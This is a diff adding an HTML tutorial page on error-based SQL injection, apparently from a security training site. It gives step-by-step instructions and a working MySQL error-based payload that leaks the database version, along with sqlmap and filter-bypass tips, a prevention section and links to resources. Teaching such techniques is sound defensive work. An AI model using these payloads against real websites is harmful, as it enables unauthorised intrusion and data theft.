@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Error-Based SQL Injection - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>💥 Error-Based SQL Injection</h1>
+    <p class="subtitle">Leverage database error messages to extract critical data</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>What is Error-Based SQL Injection?</h2>
+      <p>
+        Error-Based SQL Injection is a technique where attackers exploit improperly handled database errors to extract sensitive data directly from the database.
+        When input is not sanitized, crafted SQL payloads can trigger errors that leak valuable information in the response.
+      </p>
+    </section>
+
+    <section class="basics">
+      <h2>🔍 Key Concepts</h2>
+      <ul>
+        <li>Relies on the application displaying SQL error messages</li>
+        <li>Primarily works on MySQL, MSSQL, PostgreSQL with verbose error settings</li>
+        <li>Often used during early recon or quick data extraction</li>
+        <li>Requires the page to return detailed database error output</li>
+      </ul>
+    </section>
+
+    <section class="steps">
+      <h2>🧠 Step-by-Step Guide</h2>
+
+      <h3>Step 1: Identify injectable parameters</h3>
+      <p>Test common input points like <code>?id=</code> or <code>?product=</code> with simple payloads:</p>
+      <pre><code>https://target.com/product.php?id=1'</code></pre>
+
+      <h3>Step 2: Analyze error responses</h3>
+      <p>If you see a SQL error like:</p>
+      <pre><code>You have an error in your SQL syntax near '' at line 1</code></pre>
+      <p>It confirms the parameter is injectable.</p>
+
+      <h3>Step 3: Use crafted payloads to extract data</h3>
+      <p>Trigger database errors that reveal table/column names or data:</p>
+      <pre><code>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) a)-- -</code></pre>
+
+      <h3>Step 4: Interpret the leaked information</h3>
+      <p>The error message may now return database version or table names depending on the payload.</p>
+    </section>
+
+    <section class="examples">
+      <h2>🧪 Real-World Example</h2>
+      <pre><code># Vulnerable URL
+https://target.com/news.php?id=2
+
+# Test payload
+?id=2'
+
+# Error message observed:
+"You have an error in your SQL syntax"
+
+# Exploit to leak database version
+?id=2 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) a)-- -
+</code></pre>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Tips & Techniques</h2>
+      <ul>
+        <li>Enable verbose error logging in local labs for practice</li>
+        <li>Use tools like <code>sqlmap</code> with <code>--technique=E</code> to automate</li>
+        <li>Look for generic errors first: “SQL syntax”, “ODBC”, “near ‘…’”</li>
+        <li>Bypass filters using encodings or comment syntax like <code>--</code> or <code>#</code></li>
+      </ul>
+    </section>
+
+    <section class="defense">
+      <h2>🛡️ How to Prevent Error-Based SQLi</h2>
+      <ul>
+        <li>Use prepared statements (parameterized queries)</li>
+        <li>Sanitize and validate all user inputs</li>
+        <li>Disable detailed database error messages in production</li>
+        <li>Implement Web Application Firewalls (WAFs)</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📚 Resources & Tools</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP - SQL Injection</a></li>
+        <li><a href="https://sqlmap.org" target="_blank">sqlmap</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQLi Lab</a></li>
+        <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank">SQLMap GitHub</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
